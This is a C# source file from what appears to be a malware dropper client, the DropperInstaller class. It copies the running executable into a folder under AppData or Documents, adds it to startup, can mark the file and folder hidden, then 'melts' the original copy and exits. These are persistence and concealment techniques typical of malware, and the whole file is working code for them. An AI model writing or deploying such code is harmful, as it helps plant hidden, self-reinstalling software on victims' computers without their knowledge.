using System;
using System.IO;

namespace DropperClient.Installation
{
    public class DropperInstaller
    {
        public enum InstallLocation { AppData, Documents }

        private readonly InstallLocation _installLocation;

        private readonly ExecutableInfo runningAssembly;

        public DropperInstaller(bool hideFile, InstallLocation installLocation)
        {
            _installLocation = installLocation;
            runningAssembly = new ExecutableInfo();
        }

        public void Install()
        {
            var startupManager = new StartupManager();

            var targetFolderPath = GetInstallFolderPath(_installLocation);
            if (targetFolderPath == null) return;

            var targetExecutablePath = Path.Combine(targetFolderPath, runningAssembly.AssemblyName);

            if (!IsInstalled(targetExecutablePath))
            {
                runningAssembly.Move(targetExecutablePath);
                startupManager.AddToStartup(runningAssembly.AssemblyName, targetExecutablePath);

                if (Settings.Hide)
                {
                    var fInfo = new FileInfo(targetExecutablePath);
                    var dInfo = new FileInfo(targetFolderPath);

                    try
                    {
                        dInfo.Attributes = FileAttributes.Hidden;
                        fInfo.Attributes = FileAttributes.Hidden;
                    }
                    catch
                    {
                        return;
                    }
                }

                runningAssembly.StartMelt();
                Environment.Exit(0);
            }
        }

        public bool IsInstalled(string filePath)
        {
            return File.Exists(filePath);
        }

        private string GetInstallFolderPath(InstallLocation location)
        {
            Environment.SpecialFolder specialDirectory;

            var folderName = runningAssembly.AssemblyName.Replace(".exe", "");

            switch (location)
            {
                case InstallLocation.AppData:
                    specialDirectory = Environment.SpecialFolder.ApplicationData;
                    break;

                case InstallLocation.Documents:
                    specialDirectory = Environment.SpecialFolder.MyDocuments;
                    break;

                default:
                    specialDirectory = Environment.SpecialFolder.MyDocuments;
                    break;
            }

            string targetFolderPath = Path.Combine(Environment.GetFolderPath(specialDirectory), folderName);
            try
            {
                Directory.CreateDirectory(targetFolderPath);
            }
            catch
            {
                return null;
            }

            return targetFolderPath;
        }
    }
}